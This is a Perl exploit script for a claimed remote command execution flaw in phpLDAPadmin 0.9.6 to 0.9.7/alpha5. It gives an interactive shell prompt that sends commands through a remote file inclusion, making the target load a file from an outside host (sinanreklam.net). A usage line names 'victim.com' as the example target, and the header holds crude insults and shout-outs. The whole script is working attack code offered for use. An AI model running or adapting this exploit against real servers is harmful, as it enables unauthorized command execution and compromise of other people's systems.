#!/usr/bin/perl
#__________           ____ ________
#\______   \ ____   __| _/ \______ \____________     ____   ____   ____
# |       _// __ \ / __ |   |    |  \_  __ \__  \   / ___\ /  _ \ /    \
# |    |   \  ___// /_/ |   |    `   \  | \// __ \_/ /_/  >  <_> )   |  \
# |____|_  /\___  >____ |  /_______  /__|  (____  /\___  / \____/|___|  /
#        \/     \/     \/          \/           \//_____/             \/
# Coded By Johnnie Walker <whisky[at]bsdmail[d0t]org>
# Greets: sirh0t , Cute Eliisabeth And Tayphoon
# Suck My Dick: cobradriver , atmaca , kozan
# Red Dragon: Johhnie Walker . Nightmare . Erbil
# f0rtcu We Never f0rget You

use IO::Socket;

if ($ARGV[0] && $ARGV[1])
{
 $host = $ARGV[0];
 $path = $ARGV[1];
 $target = $ARGV[2];

 $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host",
 PeerPort => "80") || die "Can't connect!\r\n";
 while (1) {
    print 'RedDrag0n@'.$host.'$ ';
    $cmd = <STDIN>;

    if ($target == 2) {
    $file =
    "welcome.php?custom_welcome_page=http://sinanreklam.net/banner.gif?cmd="
    }
    chop($cmd);
    last if ($cmd eq 'exit');
    print $sock "GET ".$path.$file.$cmd." HTTP/1.1\r\nHost:
    ".$host."\r\nConnection: Keep-Alive\r\n\r\n";
    $vuln=0;
    while ($ans = <$sock>)
       {
        if ($vuln == 1) { print "$ans"; }
        last if ($ans =~ /^_end_/);
        if ($ans =~ /^_begin_/) { $vuln = 1; }
       }
      if ($vuln == 0) {print "Exploit Failed :(\r\n";exit();}
   }
 }
else {
 print "phpLDAPadmin 0.9.6 - 0.9.7/alpha5 Remote Command Execution\r\n\r\n";
 print "Coded By Johhnie Walker\r\n\r\n";
 print "Greets To sirh0t , Cute Eliisabeth And Tayphoon\r\n\r\n";
 print "Usage: perl $0 <host> <path_to_phpldapadmin> [target_nr] 2\r\n\r\n";
 print "Example: perl $0 victim.com /phpldapadmin/ 2 \r\n\r\n";
exit;
}
